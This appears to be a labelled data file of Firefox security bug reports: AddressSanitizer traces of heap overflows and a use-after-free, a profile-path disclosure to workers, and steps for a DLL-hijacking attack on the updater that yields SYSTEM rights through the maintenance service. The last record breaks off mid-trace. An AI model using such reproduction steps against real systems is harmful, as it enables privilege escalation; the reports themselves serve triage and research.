out-of-bound read in gfxskipcharsiterator setoffsets reproduces on trunk 20823 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 4 at thread t0 0 in gfxskipcharsiterator setoffsets unsigned int bool src/gfx/thebes/gfxskipchars.cpp:91 1 in gfxskipcharsiterator setoriginaloffset int src dist/include/gfxskipchars.h:232 2 in nstextframe reflowtext nslinelayout int nsrenderingcontext bool nshtmlreflowmetrics unsigned int src/layout/generic/nstextframethebes.cpp:7877 3 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:847 4 in nsinlineframe reflowinlineframe nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nsiframe unsigned int src/layout/generic/nsinlineframe.cpp:680 5 in nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int src/layout/generic/nsinlineframe.cpp:543 6 in nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsinlineframe.cpp:395 7 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:840 8 in nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus src/layout/generic/nsblockframe.cpp:3725 9 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool src/layout/generic/nsblockframe.cpp:3522 10 in nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3376 11 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2483 12 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2000 13 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1043 14 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate src/layout/generic/nsblockreflowcontext.cpp:268 15 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3101 16 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2480 17 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2000 18 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1043 19 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:953 20 in nscanvasframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nscanvasframe.cpp:493 21 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:953 22 in nshtmlscrollframe reflowscrolledframe scrollreflowstate bool bool nshtmlreflowmetrics bool src/layout/generic/nsgfxscrollframe.cpp:433 23 in nshtmlscrollframe reflowcontents scrollreflowstate nshtmlreflowmetrics const src/layout/generic/nsgfxscrollframe.cpp:533 24 in nshtmlscrollframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsgfxscrollframe.cpp:774 25 in nscontainerframe reflowchild nsiframe nsprescontext nshtmlreflowmetrics nshtmlreflowstate const int int unsigned int unsigned int nsoverflowcontinuationtracker src/layout/generic/nscontainerframe.cpp:953 26 in viewportframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsviewportframe.cpp:202 27 in presshell doreflow nsiframe bool src/layout/base/nspresshell.cpp:7558 28 in presshell processreflowcommands bool src/layout/base/nspresshell.cpp:7699 29 in presshell flushpendingnotifications mozilla changestoflush src/layout/base/nspresshell.cpp:3907 30 in presshell flushpendingnotifications mozflushtype src/layout/base/nspresshell.cpp:3757 31 in nsdocumentviewer loadcomplete tag_nsresult src/layout/base/nsdocumentviewer.cpp:990 32 in nsdocshell endpageload nsiwebprogress nsichannel tag_nsresult src/docshell/base/nsdocshell.cpp:6514 33 in nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult src/docshell/base/nsdocshell.cpp:6342 34 in non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult src/docshell/base/nsdocshell.cpp:6349 35 in nsdocloader dofireonstatechange nsiwebprogress nsirequest int tag_nsresult src/uriloader/base/nsdocloader.cpp:1305 36 in nsdocloader dostopdocumentload nsirequest tag_nsresult src/uriloader/base/nsdocloader.cpp:885 37 in nsdocloader docloaderisempty bool src/uriloader/base/nsdocloader.cpp:775 38 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult src/uriloader/base/nsdocloader.cpp:659 39 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult src/uriloader/base/nsdocloader.cpp:663 40 in nsloadgroup removerequest nsirequest nsisupports tag_nsresult src/netwerk/base/src/nsloadgroup.cpp:676 41 in nsdocument dounblockonload src/content/base/src/nsdocument.cpp:7361 42 in nsdocument unblockonload bool src/content/base/src/nsdocument.cpp:7303 43 in nsdocument dispatchcontentloadedevents src/content/base/src/nsdocument.cpp:4280 44 in nsrunnablemethodimpl void nsdocument true run src dist/include/nsthreadutils.h:367 45 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 46 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:237 47 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 48 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:215 49 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:208 50 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 51 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 52 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:288 53 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3823 54 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3890 55 in xre_main src/toolkit/xre/nsapprunner.cpp:4088 56 in do_main int char src/browser/app/nsbrowserapp.cpp:174 57 in main src/browser/app/nsbrowserapp.cpp:279 58 in is located 0 bytes to the right of 204-byte region allocated by thread t0 here 0 in interceptor_malloc 1 in moz_xmalloc src/memory/mozalloc/mozalloc.cpp:54 2 in operator new unsigned long src dist/include/mozilla/mozalloc.h:212 3 in gfxskipchars buildshortcuts src/gfx/thebes/gfxskipchars.cpp:25 4 in gfxskipchars takefrom gfxskipchars src/gfx/thebes/gfxskipchars.h:106 5 in gfxtextrun gfxtextrun gfxtextrunfactory parameters const unsigned int gfxfontgroup unsigned int src/gfx/thebes/gfxfont.cpp:4568 6 in gfxtextrun create gfxtextrunfactory parameters const unsigned int gfxfontgroup unsigned int src/gfx/thebes/gfxfont.cpp:4551 7 in gfxfontgroup maketextrun unsigned char const unsigned int gfxtextrunfactory parameters const unsigned int src/gfx/thebes/gfxfont.cpp:3592 8 in gfxtextrun maketextrun unsigned char unsigned char const unsigned int gfxfontgroup gfxtextrunfactory parameters const unsigned int src/layout/generic/nstextframethebes.cpp:555 9 in buildtextrunsscanner buildtextrunforframes void src/layout/generic/nstextframethebes.cpp:2052 10 in buildtextrunsscanner flushframes bool bool src/layout/generic/nstextframethebes.cpp:1411 11 in buildtextrunsscanner scanframe nsiframe src/layout/generic/nstextframethebes.cpp:1603 12 in buildtextrunsscanner scanframe nsiframe src/layout/generic/nstextframethebes.cpp:1643 13 in buildtextruns gfxcontext nstextframe nsiframe nslinelist_iterator const nstextframe textruntype src/layout/generic/nstextframethebes.cpp:1314 14 in nstextframe ensuretextrun nstextframe textruntype gfxcontext nsiframe nslinelist_iterator const unsigned int src/layout/generic/nstextframethebes.cpp:2468 15 in nstextframe reflowtext nslinelayout int nsrenderingcontext bool nshtmlreflowmetrics unsigned int src/layout/generic/nstextframethebes.cpp:7816 16 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:847 17 in nsinlineframe reflowinlineframe nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nsiframe unsigned int src/layout/generic/nsinlineframe.cpp:680 18 in nsinlineframe reflowframes nsprescontext nshtmlreflowstate const nsinlineframe inlinereflowstate nshtmlreflowmetrics unsigned int src/layout/generic/nsinlineframe.cpp:543 19 in nsinlineframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsinlineframe.cpp:395 20 in nslinelayout reflowframe nsiframe unsigned int nshtmlreflowmetrics bool src/layout/generic/nslinelayout.cpp:840 21 in nsblockframe reflowinlineframe nsblockreflowstate nslinelayout nslinelist_iterator nsiframe linereflowstatus src/layout/generic/nsblockframe.cpp:3725 22 in nsblockframe doreflowinlineframes nsblockreflowstate nslinelayout nslinelist_iterator nsflowarearect int nsfloatmanager savedstate bool linereflowstatus bool src/layout/generic/nsblockframe.cpp:3522 23 in nsblockframe reflowinlineframes nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3376 24 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2483 25 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2000 26 in nsblockframe reflow nsprescontext nshtmlreflowmetrics nshtmlreflowstate const unsigned int src/layout/generic/nsblockframe.cpp:1043 27 in nsblockreflowcontext reflowblock nsrect const bool nscollapsingmargin int bool nslinebox nshtmlreflowstate unsigned int nsblockreflowstate src/layout/generic/nsblockreflowcontext.cpp:268 28 in nsblockframe reflowblockframe nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:3101 29 in nsblockframe reflowline nsblockreflowstate nslinelist_iterator bool src/layout/generic/nsblockframe.cpp:2480 30 in nsblockframe reflowdirtylines nsblockreflowstate src/layout/generic/nsblockframe.cpp:2000 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 04 fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe stats 250m malloced 538m for red zones by 403569 calls stats 47m realloced by 24065 calls stats 225m freed by 283304 calls stats 113m really freed by 208600 calls stats 612m 612m-0m mmaped 153 maps 0 unmaps mmaps by size class 10:253890 11:12282 12:3072 13:1536 14:1280 15:256 16:1152 17:1280 18:48 19:40 20:24 mallocs by size class 10:374083 11:19834 12:2763 13:1873 14:1627 15:435 16:1456 17:1366 18:70 19:40 20:22 frees by size class 10:258335 11:17089 12:1638 13:1639 14:1453 15:310 16:1376 17:1349 18:58 19:38 20:19 rfrees by size class 10:193497 11:10852 12:866 13:748 14:834 15:188 16:977 17:607 18:26 19:4 20:1 stats malloc large 1498 small slow 4502 stats stackdepot 0 ids 0m mapped 20823 aborting	11
heap-buffer-overflow write in nssaveascharset docharsetconversion 26942 error addresssanitizer heap-buffer-overflow on address at pc bp sp write of size 1 at thread t0 0 in nssaveascharset docharsetconversion unsigned short const char src/intl/unicharutil/src/nssaveascharset.cpp:193 1 in nssaveascharset convert unsigned short const char src/intl/unicharutil/src/nssaveascharset.cpp:103 2 in nsencodingformsubmission encodeval nsastring_internal const nscstring bool src/content/html/content/src/nsformsubmission.cpp:734 3 in nsfsurlencoded urlencode nsastring_internal const nscstring src/content/html/content/src/nsformsubmission.cpp:365 4 in nsfsurlencoded addnamevaluepair nsastring_internal const nsastring_internal const src/content/html/content/src/nsformsubmission.cpp:130 5 in nshtmltextareaelement submitnamesvalues nsformsubmission src/content/html/content/src/nshtmltextareaelement.cpp:1052 6 in non-virtual thunk to nshtmltextareaelement submitnamesvalues nsformsubmission src/content/html/content/src/nshtmltextareaelement.cpp:1053 7 in nshtmlformelement walkformelements nsformsubmission src/content/html/content/src/nshtmlformelement.cpp:998 8 in nshtmlformelement buildsubmission nsformsubmission nsevent src/content/html/content/src/nshtmlformelement.cpp:779 9 in nshtmlformelement dosubmit nsevent src/content/html/content/src/nshtmlformelement.cpp:713 10 in nshtmlformelement dosubmitorreset nsevent int src/content/html/content/src/nshtmlformelement.cpp:664 11 in nshtmlformelement submit src/content/html/content/src/nshtmlformelement.cpp:396 12 in non-virtual thunk to nshtmlformelement submit src/content/html/content/src/nshtmlformelement.cpp:398 13 in nsidomhtmlformelement_submit jscontext unsigned int js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:4656 14 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:373 15 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:391 16 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2367 17 in js runscript jscontext js handle jsscript js stackframe src/js/src/jsinterp.cpp:348 18 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:537 19 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:576 20 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5621 21 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1525 22 in nsscriptloader evaluatescript nsscriptloadrequest nsstring const src/content/base/src/nsscriptloader.cpp:859 23 in nsscriptloader processrequest nsscriptloadrequest src/content/base/src/nsscriptloader.cpp:757 24 in nsscriptloader processscriptelement nsiscriptelement src/content/base/src/nsscriptloader.cpp:705 25 in nsscriptelement maybeprocessscript src/content/base/src/nsscriptelement.cpp:139 26 in nsiscriptelement attempttoexecute src dist/include/nsiscriptelement.h:220 27 in nshtml5treeopexecutor runscript nsicontent src/parser/html/nshtml5treeopexecutor.cpp:791 28 in nshtml5treeopexecutor runflushloop src/parser/html/nshtml5treeopexecutor.cpp:595 29 in nshtml5executorflusher run src/parser/html/nshtml5streamparser.cpp:127 30 in nsthread processnextevent bool bool src/xpcom/threads/nsthread.cpp:627 31 in ns_processnextevent_p nsithread bool src/objdir-ff-asan-sym/xpcom/build/nsthreadutils.cpp:237 32 in mozilla ipc messagepump run base messagepump delegate src/ipc/glue/messagepump.cpp:82 33 in messageloop runinternal src/ipc/chromium/src/base/message_loop.cc:215 34 in messageloop runhandler src/ipc/chromium/src/base/message_loop.cc:208 35 in messageloop run src/ipc/chromium/src/base/message_loop.cc:182 36 in nsbaseappshell run src/widget/xpwidgets/nsbaseappshell.cpp:163 37 in nsappstartup run src/toolkit/components/startup/nsappstartup.cpp:288 38 in xremain xre_mainrun src/toolkit/xre/nsapprunner.cpp:3823 39 in xremain xre_main int char nsxreappdata const src/toolkit/xre/nsapprunner.cpp:3890 40 in xre_main src/toolkit/xre/nsapprunner.cpp:4088 41 in do_main int char src/browser/app/nsbrowserapp.cpp:174 42 in main src/browser/app/nsbrowserapp.cpp:279 43 in is located 0 bytes to the right of 694-byte region allocated by thread t0 here 0 in interceptor_realloc 1 in pr_realloc src/nsprpub/pr/src/malloc/prmem.c:450 2 in nssaveascharset handlefallback unsigned int char int int int src/intl/unicharutil/src/nssaveascharset.cpp:147 3 in nssaveascharset docharsetconversion unsigned short const char src/intl/unicharutil/src/nssaveascharset.cpp:227 4 in nssaveascharset convert unsigned short const char src/intl/unicharutil/src/nssaveascharset.cpp:103 5 in nsencodingformsubmission encodeval nsastring_internal const nscstring bool src/content/html/content/src/nsformsubmission.cpp:734 6 in nsfsurlencoded urlencode nsastring_internal const nscstring src/content/html/content/src/nsformsubmission.cpp:365 7 in nsfsurlencoded addnamevaluepair nsastring_internal const nsastring_internal const src/content/html/content/src/nsformsubmission.cpp:130 8 in nshtmltextareaelement submitnamesvalues nsformsubmission src/content/html/content/src/nshtmltextareaelement.cpp:1052 9 in non-virtual thunk to nshtmltextareaelement submitnamesvalues nsformsubmission src/content/html/content/src/nshtmltextareaelement.cpp:1053 10 in nshtmlformelement walkformelements nsformsubmission src/content/html/content/src/nshtmlformelement.cpp:998 11 in nshtmlformelement buildsubmission nsformsubmission nsevent src/content/html/content/src/nshtmlformelement.cpp:779 12 in nshtmlformelement dosubmit nsevent src/content/html/content/src/nshtmlformelement.cpp:713 13 in nshtmlformelement dosubmitorreset nsevent int src/content/html/content/src/nshtmlformelement.cpp:664 14 in nshtmlformelement submit src/content/html/content/src/nshtmlformelement.cpp:396 15 in non-virtual thunk to nshtmlformelement submit src/content/html/content/src/nshtmlformelement.cpp:398 16 in nsidomhtmlformelement_submit jscontext unsigned int js value src/objdir-ff-asan-sym/js/xpconnect/src/dom_quickstubs.cpp:4656 17 in js calljsnative jscontext int jscontext unsigned int js value js callargs const src/js/src/jscntxtinlines.h:373 18 in js invokekernel jscontext js callargs js maybeconstruct src/js/src/jsinterp.cpp:391 19 in js interpret jscontext js stackframe js interpmode src/js/src/jsinterp.cpp:2367 20 in js runscript jscontext js handle jsscript js stackframe src/js/src/jsinterp.cpp:348 21 in js executekernel jscontext js handle jsscript jsobject js value const js executetype js stackframe js value src/js/src/jsinterp.cpp:537 22 in js execute jscontext js handle jsscript jsobject js value src/js/src/jsinterp.cpp:576 23 in js evaluate jscontext js handle jsobject js compileoptions unsigned short const unsigned long js value src/js/src/jsapi.cpp:5621 24 in nsjscontext evaluatestring nsastring_internal const jsobject nsiprincipal nsiprincipal char const unsigned int jsversion nsastring_internal bool src/dom/base/nsjsenvironment.cpp:1525 25 in nsscriptloader evaluatescript nsscriptloadrequest nsstring const src/content/base/src/nsscriptloader.cpp:859 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 fb fb fb fb fb fb fb fb fb fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap righ redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 asan internal fe stats 246m malloced 267m for red zones by 396769 calls stats 46m realloced by 23752 calls stats 213m freed by 267399 calls stats 79m really freed by 187724 calls stats 464m 464m-0m mmaped 116 maps 0 unmaps mmaps by size class 8:294894 9:32764 10:8190 11:12282 12:2048 13:1536 14:1280 15:384 16:1152 17:1312 18:48 19:40 20:24 mallocs by size class 8:332060 9:31374 10:8623 11:15688 12:2433 13:1698 14:1587 15:391 16:1426 17:1357 18:70 19:40 20:22 frees by size class 8:219567 9:22423 10:4961 11:13499 12:1444 13:1211 14:1418 15:267 16:1156 17:1339 18:57 19:38 20:19 rfrees by size class 8:166298 9:7607 10:2078 11:8865 12:594 13:509 14:423 15:153 16:968 17:198 18:26 19:4 20:1 stats malloc large 1489 small slow 2310 stats stackdepot 0 ids 0m mapped 26942 aborting	11
disclosure of profile directory name in javascript variable visible to workers the variable os in a web workers scope contains some peculiar information among them os constants path profiledir which is the full path to the firefox profile directory e.g home/freddy/.mozilla/firefox/6efxvygfz.default i know that the path name contains these random characters for security reasons although a quick search revealed no easy way to turn this path disclosure into a serious exploit i suppose it still poses a security risk if this is wrong please uncheck the security-confidential flag i will attach a simple test case that explains the issue	2
the updater.exe loads the cryptsp.dll from the update directory while perfoming an update besides fixed bug 750850 the updater.exe in ff 18.0 is vulnerable to a loadlibrary-based attack the exe loads the cryptsp.dll from the update directory while perfoming an update reproduce i have attached a poc to perfom an update of 18.0 to 18.0 feature or bug which i have tested on win7 pro 32bit and 64bit with firefox 18.0 1 download the poc and extract the files 2 download and save the file as update.mar in the poc directory 3 execute sc start mozillamaintenance mozillamaintenance software-update path_to_poc_dir+\updater.exe path_to_poc_dir path_to_firefox_dir+\updated 1 for example sc start mozillamaintenance mozillamaintenance software-update c users\ash\desktop\poc\updater.exe c users\ash\desktop\poc c program files x86 mozilla firefox\updated 1 to start the maintainservice the fake cryptsp.dll executes system calc in dllmain so you will see a calc.exe and a cmd.exe running with system rights in the process list kill the calc.exe to finish the update the cryptsp.dll from the system directory should be loaded	2
wrapping a webidl object should beware wrapnativeparent reentering itself xpcwrappednative getneworused has comments like 540 take the performance hit of checking the hashtable again in case 541 the precreate call caused the wrapper to get created through some 542 interesting path the dom code tends to make this happen sometimes the point is that if our parent is a node wrapnativeparent can end up running xbl constructors for it which can try to wrap us manage to do that and then unwind back to the generated wrap with the object already wrapped and possibly preserved and then we ll go and setwrapper after that clobbering bits and triggering asserts i think we can just get away with checking for a cached object after wrapnativeparent and returning it that certainly fixes my minimal testcase at least the bad news is that i think we may want this on aurora and maybe beta i ran into this while working on xulelement but i ca n't guarantee that we have no cases in which some webidl binding is parented to a node but can be wrapped before that node if we can prove we have no such cases great then we should open this up	9
use-after-free crash xul nsimageloadingcontent onstopcontainer the attached testcase crashes when loaded in latest firefox nightly crashes at random memory addresses stack trace on windows this was with the previous testcase which loaded a jpeg file instead of png from data uri xul nsimageloadingcontent onstopcontainer 64fcc61e ff5128 call dword ptr ecx+28h ds:002b:00000029 0:000 x86 cdb reading initial command kp 16 q childebp retaddr 0033cb58 64e6eac6 xul nsimageloadingcontent onstopcontainer class imgirequest arequest class imgicontainer acontainer 0033cb6c 64e2229d xul imgrequestproxy onstopcontainer class imgicontainer image 0033cbfc 64dfd62b xul imgrequest onstopdecode class imgirequest arequest tag_nsresult astatus ns_ok 0n0 wchar_t astatusarg 0033cc24 6501fca4 xul mozilla image decoder postdecodedone void warning unable to verify checksum for c program files x86 mozilla firefox\gkmedias.dll 0033cc2c 66072e8f xul mozilla image term_source struct jpeg_decompress_struct jd 0033cc38 64f86b63 gkmedias jpeg_finish_decompress struct jpeg_decompress_struct cinfo 0033ce74 64f5beaf xul mozilla image nsjpegdecoder writeinternal char abuffer g unsigned int acount 0033ce90 64faf970 xul mozilla image rasterimage writetodecoder char abuffer g unsigned int acount 0033ceac 64f6ff0b xul mozilla image rasterimage decodesomedata unsigned int amaxbytes 0033ceec 64fbaa9b xul mozilla image rasterimage decodeworker decodesomeofimage class mozilla image rasterimage aimg mozilla image rasterimage decodeworker decodetype adecodetype decode_type_normal 0n0 0033cf28 64e91dbf xul mozilla image rasterimage decodeworker run void 0033cf98 6503c86f xul nsthread processnextevent bool maywait false bool result 0033cfcc 6504ca2b xul mozilla ipc messagepump run class base messagepump delegate adelegate 0033d004 6504c9d3 xul messageloop runhandler void 0033d020 6502fc8f xul messageloop run void 0033d02c 6504c953 xul nsbaseappshell run void 0033ef80 65076c9d xul nsappshell run void 0033ef8c 64fbc83a xul nsappstartup run void 0033f058 6501522d xul xremain xre_mainrun void 0033f074 65037bb4 xul xremain xre_main int argc 0n5 char argv struct nsxreappdata aappdata warning unable to verify checksum for firefox.exe 0033f18c 00c31742 xul xre_main int argc 0n5 char argv struct nsxreappdata aappdata unsigned int aflags 0 0033fc64 00c31a64 firefox wmain int argc 0n5 wchar_t argv quit	11
invalid write in cairo_xlib_surface_add_glyph 10987 error addresssanitizer unknown-crash on address at pc bp sp write of size 8 at thread t0 0 in interceptor_memmove 1 in 2 in cairo_xlib_surface_add_glyph src/gfx/cairo/cairo/src/cairo-xlib-surface.c:4321 3 in cairo_xlib_surface_emit_glyphs src/gfx/cairo/cairo/src/cairo-xlib-surface.c:4577 4 in cairo_xlib_surface_show_glyphs src/gfx/cairo/cairo/src/cairo-xlib-surface.c:4904 5 in cairo_surface_show_text_glyphs src/gfx/cairo/cairo/src/cairo-surface.c:2763 6 in cairo_gstate_show_text_glyphs src/gfx/cairo/cairo/src/cairo-gstate.c:1998 7 in moz_cairo_show_glyphs src/gfx/cairo/cairo/src/cairo.c:3523 8 in glyphbuffer flush cairo gfxfont drawmode bool gfxtextobjectpaint gfxmatrix const bool src/gfx/thebes/gfxfont.cpp:1576 9 in gfxfont draw gfxtextrun unsigned int unsigned int gfxcontext gfxfont drawmode gfxpoint gfxfont spacing gfxtextobjectpaint src/gfx/thebes/gfxfont.cpp:1967 10 in gfxtextrun drawglyphs gfxfont gfxcontext gfxfont drawmode gfxpoint gfxtextobjectpaint unsigned int unsigned int gfxtextrun propertyprovider unsigned int unsigned int src/gfx/thebes/gfxfont.cpp:4950 11 in gfxtextrun draw gfxcontext gfxpoint gfxfont drawmode unsigned int unsigned int gfxtextrun propertyprovider double gfxtextobjectpaint gfxtextrun drawcallbacks src/gfx/thebes/gfxfont.cpp:5151 12 in nssvgglyphframe drawcharacters characteriterator gfxcontext gfxfont drawmode gfxtextobjectpaint src/layout/svg/nssvgglyphframe.cpp:613 13 in nssvgglyphframe paintsvg nsrenderingcontext nsintrect const src/layout/svg/nssvgglyphframe.cpp:441 14 in nsdisplaysvgglyphs paint nsdisplaylistbuilder nsrenderingcontext src/layout/svg/nssvgglyphframe.cpp:254 15 in mozilla framelayerbuilder drawthebeslayer mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void src/layout/base/framelayerbuilder.cpp:3341 16 in paintbuffer src/gfx/layers/basic/basicthebeslayer.h:94 17 in mozilla layers basicshadowablethebeslayer paintbuffer gfxcontext nsintregion const nsintregion const nsintregion const bool void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void src/gfx/layers/basic/basicthebeslayer.cpp:400 18 in mozilla layers basicthebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basicthebeslayer.cpp:187 19 in mozilla layers basicshadowablethebeslayer paintthebes gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basicthebeslayer.cpp:301 20 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext src/gfx/layers/basic/basiclayermanager.cpp:819 21 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basiclayermanager.cpp:934 22 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext src/gfx/layers/basic/basiclayermanager.cpp:835 23 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basiclayermanager.cpp:934 24 in mozilla layers basiclayermanager paintselforchildren mozilla layers paintcontext gfxcontext src/gfx/layers/basic/basiclayermanager.cpp:835 25 in mozilla layers basiclayermanager paintlayer gfxcontext mozilla layers layer void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers readbackprocessor src/gfx/layers/basic/basiclayermanager.cpp:934 26 in mozilla layers basiclayermanager endtransactioninternal void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags src/gfx/layers/basic/basiclayermanager.cpp:590 27 in endtransaction src/gfx/layers/basic/basiclayermanager.cpp:509 28 in mozilla layers basicshadowlayermanager endtransaction void mozilla layers thebeslayer gfxcontext nsintregion const nsintregion const void void mozilla layers layermanager endtransactionflags src/gfx/layers/basic/basiclayermanager.cpp:1144 29 in nsdisplaylist paintforframe nsdisplaylistbuilder nsrenderingcontext nsiframe unsigned int const src/layout/base/nsdisplaylist.cpp:1168 30 in nsdisplaylist paintroot nsdisplaylistbuilder nsrenderingcontext unsigned int const src/layout/base/nsdisplaylist.cpp:1030 31 in nslayoututils paintframe nsrenderingcontext nsiframe nsregion const unsigned int unsigned int src/layout/base/nslayoututils.cpp:2014 32 in presshell paint nsview nsregion const unsigned int src/layout/base/nspresshell.cpp:5414 33 in nsviewmanager processpendingupdatesforview nsview bool src/view/src/nsviewmanager.cpp:399 34 in nsrefreshdriver tick long mozilla timestamp src/layout/base/nsrefreshdriver.cpp:955 35 in tickdriver src/layout/base/nsrefreshdriver.cpp:164 36 in mozilla refreshdrivertimer tick src/layout/base/nsrefreshdriver.cpp:156 37 in nstimerimpl fire src/xpcom/threads/nstimerimpl.cpp:482 38 in nstimerevent run 